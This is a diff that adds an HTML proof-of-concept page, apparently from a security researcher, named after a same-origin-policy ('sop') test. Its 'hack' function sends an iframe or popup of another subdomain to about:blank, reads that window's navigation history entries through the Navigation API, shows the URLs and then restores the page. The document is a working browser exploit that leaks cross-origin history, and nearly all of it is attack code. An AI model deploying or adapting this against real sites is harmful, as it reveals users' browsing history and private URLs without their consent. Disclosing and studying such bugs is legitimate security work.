@@ -1,0 +1,52 @@
+<html>
+  <head></head>
+  <body>
+    <script>
+      // Function takes a window object
+      // and a name of an element to store the leak
+      function hack(w, t) {
+        w.location = "about:blank";
+        setTimeout(() => {
+          let entries = w.navigation.entries();
+          w.history.back(); // To restore the page after the leak
+          let target = document.getElementById(t);
+          target.innerHTML = "";
+          for (e of entries) {
+            target.append(e.url);
+            target.append(document.createElement("br"));
+          }
+        }, 400);
+      }
+      // Window object placeholder
+      var newWin;
+
+      // Open a new window
+      function pop() {
+        newWin = window.open("https://subdomain2.joaxcar.com/sop/2.html");
+      }
+
+      // Leak from the window
+      function pull() {
+        hack(newWin, "y");
+      }
+    </script>
+
+    <h2>Iframe example</h2>
+    <iframe src="https://subdomain2.joaxcar.com/sop/2.html"></iframe>
+    <div>
+      <button onclick="hack(frames[0], 'x')">
+         Leak history from iframe
+      </button>
+      <div id="x"></div>
+    </div>
+    <br />
+    <br />
+    <h2>New window example</h2>
+    <div>
+      <button onclick="pop()">Open window</button>
+      <br />
+      <button onclick="pull()">Leak history from window</button>
+      <div id="y"></div>
+    </div>
+  </body>
+</html>
